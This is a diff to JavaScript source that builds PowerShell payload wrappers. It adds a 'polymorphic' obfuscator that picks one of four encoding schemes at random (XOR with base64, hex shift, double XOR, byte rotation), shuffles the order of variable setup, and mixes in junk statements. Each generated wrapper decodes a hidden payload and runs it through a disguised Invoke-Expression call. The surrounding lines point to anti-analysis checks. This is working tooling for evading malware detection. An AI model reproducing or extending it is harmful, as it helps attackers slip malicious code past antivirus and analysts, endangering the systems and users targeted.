@@ -271,32 +271,141 @@ if (([System.DateTime]::Now - $${v3}).TotalMilliseconds -lt ${Math.floor(sleepMs
   return antiAnalysis + '\n' + code
 }
 
-/* ── Encryption Wrapper ──────────────────────────────────── */
+/* ── Polymorphic Encryption Wrapper (v4.5) ───────────────── */
 
-function applyEncryptionWrapper(code) {
-  const key = randomXorKey(16)
-  const encoded = toBase64(code)
-  const keyVar = randomVarName('short')
-  const dataVar = randomVarName('short')
-  const decodedVar = randomVarName('short')
-  const funcName = randomFuncName()
-
-  const xorEncoded = Array.from(encoded)
-    .map((c, i) => c.charCodeAt(0) ^ key[i % key.length])
-
-  return `# Encrypted payload wrapper
-$${keyVar} = @(${key.join(',')})
-$${dataVar} = @(${xorEncoded.join(',')})
-
-function ${funcName}($d, $k) {
-    $r = @()
-    for ($i = 0; $i -lt $d.Length; $i++) {
-        $r += [byte]($d[$i] -bxor $k[$i % $k.Length])
-    }
-    return [System.Text.Encoding]::ASCII.GetString($r)
+function psJunk() {
+  const pool = [
+    () => { const v = randomVarName('short'); return `$${v} = [int](${Math.floor(Math.random()*999)} * ${Math.floor(Math.random()*99)} + ${Math.floor(Math.random()*9999)}) % 256` },
+    () => { const v = randomVarName('short'); return `$${v} = [System.BitConverter]::GetBytes(${Math.floor(Math.random()*0xFFFFFF)})` },
+    () => { const v = randomVarName('short'); return `$${v} = "${Array.from({length: 6}, () => String.fromCharCode(65 + Math.floor(Math.random()*26))).join('')}"` },
+    () => `[void]([Math]::Pow(${Math.floor(Math.random()*99)}, ${2 + Math.floor(Math.random()*3)}))`,
+  ]
+  return pool[Math.floor(Math.random() * pool.length)]()
 }
 
-$${decodedVar} = ${funcName} $${dataVar} $${keyVar}
-& ( $ShellId[1]+$ShellId[13]+'x') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($${decodedVar})))
+function psLoopJunk(iv) {
+  const pool = [
+    () => `        [void]($${iv} * ${3 + Math.floor(Math.random()*17)} + ${Math.floor(Math.random()*255)})`,
+    () => `        [void]($${iv} -bxor ${Math.floor(Math.random()*0xFF)})`,
+  ]
+  return pool[Math.floor(Math.random() * pool.length)]()
+}
+
+function psShuf(arr) {
+  const a = [...arr]; for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]] }; return a
+}
+
+function applyEncryptionWrapper(code) {
+  const m = Math.floor(Math.random() * 4)
+  switch (m) {
+    case 0: return psWrapperXorB64(code)
+    case 1: return psWrapperHexShift(code)
+    case 2: return psWrapperMultiXor(code)
+    case 3: return psWrapperByteRot(code)
+    default: return psWrapperXorB64(code)
+  }
+}
+
+function psWrapperXorB64(code) {
+  const key = randomXorKey(16)
+  const b64 = toBase64(code)
+  const xorData = Array.from(b64).map((c, i) => c.charCodeAt(0) ^ key[i % key.length])
+
+  const dv = randomVarName('short'), kv = randomVarName('short')
+  const fv = randomFuncName(), rv = randomVarName('short'), iv = randomVarName('short')
+
+  const inits = psShuf([
+    `$${kv} = @(${key.join(',')})`,
+    `$${dv} = @(${xorData.join(',')})`,
+    psJunk(), psJunk(),
+  ])
+
+  return `# Polymorphic payload
+${inits.join('\n')}
+
+function ${fv}($d, $k) {
+    $${rv} = @()
+    for ($${iv} = 0; $${iv} -lt $d.Length; $${iv}++) {
+${psLoopJunk(iv)}
+        $${rv} += [byte]($d[$${iv}] -bxor $k[$${iv} % $k.Length])
+    }
+    return [System.Text.Encoding]::ASCII.GetString($${rv})
+}
+
+& ($ShellId[1]+$ShellId[13]+'X') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${kv})))
+`
+}
+
+function psWrapperHexShift(code) {
+  const shift = 3 + Math.floor(Math.random() * 25)
+  const hexStr = Array.from(code).map(c => ((c.charCodeAt(0) + shift) % 256).toString(16).padStart(2, '0')).join('')
+
+  const dv = randomVarName('short'), sv = randomVarName('short')
+  const fv = randomFuncName(), rv = randomVarName('short')
+
+  const inits = psShuf([`$${dv} = "${hexStr}"`, `$${sv} = ${shift}`, psJunk()])
+
+  return `${inits.join('\n')}
+
+function ${fv}($h, $s) {
+    $${rv} = ""
+    for ($i = 0; $i -lt $h.Length; $i += 2) {
+${psLoopJunk('i')}
+        $b = [Convert]::ToInt32($h.Substring($i, 2), 16)
+        $${rv} += [char](($b - $s + 256) % 256)
+    }
+    return $${rv}
+}
+
+& ($ShellId[1]+$ShellId[13]+'X') (${fv} $${dv} $${sv})
+`
+}
+
+function psWrapperMultiXor(code) {
+  const k1 = randomXorKey(16), k2 = randomXorKey(16)
+  const enc = Array.from(code).map((c, i) => (c.charCodeAt(0) ^ k1[i % k1.length]) ^ k2[i % k2.length])
+
+  const dv = randomVarName('short'), k1v = randomVarName('short'), k2v = randomVarName('short')
+  const fv = randomFuncName(), rv = randomVarName('short')
+
+  const inits = psShuf([`$${dv} = @(${enc.join(',')})`, `$${k1v} = @(${k1.join(',')})`, `$${k2v} = @(${k2.join(',')})`, psJunk(), psJunk()])
+
+  return `${inits.join('\n')}
+
+function ${fv}($d, $a, $b) {
+    $${rv} = ""
+    for ($i = 0; $i -lt $d.Length; $i++) {
+${psLoopJunk('i')}
+        $${rv} += [char](($d[$i] -bxor $b[$i % $b.Length]) -bxor $a[$i % $a.Length])
+    }
+    return $${rv}
+}
+
+& ($ShellId[1]+$ShellId[13]+'X') (${fv} $${dv} $${k1v} $${k2v})
+`
+}
+
+function psWrapperByteRot(code) {
+  const rotN = 3 + Math.floor(Math.random() * 50)
+  const b64 = toBase64(code)
+  const rot = Array.from(b64).map(c => (c.charCodeAt(0) + rotN) % 256)
+
+  const dv = randomVarName('short'), nv = randomVarName('short')
+  const fv = randomFuncName(), rv = randomVarName('short')
+
+  const inits = psShuf([`$${dv} = @(${rot.join(',')})`, `$${nv} = ${rotN}`, psJunk(), psJunk()])
+
+  return `${inits.join('\n')}
+
+function ${fv}($d, $n) {
+    $${rv} = ""
+    for ($i = 0; $i -lt $d.Length; $i++) {
+${psLoopJunk('i')}
+        $${rv} += [char](($d[$i] - $n + 256) % 256)
+    }
+    return $${rv}
+}
+
+& ($ShellId[1]+$ShellId[13]+'X') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${nv})))
 `
 }
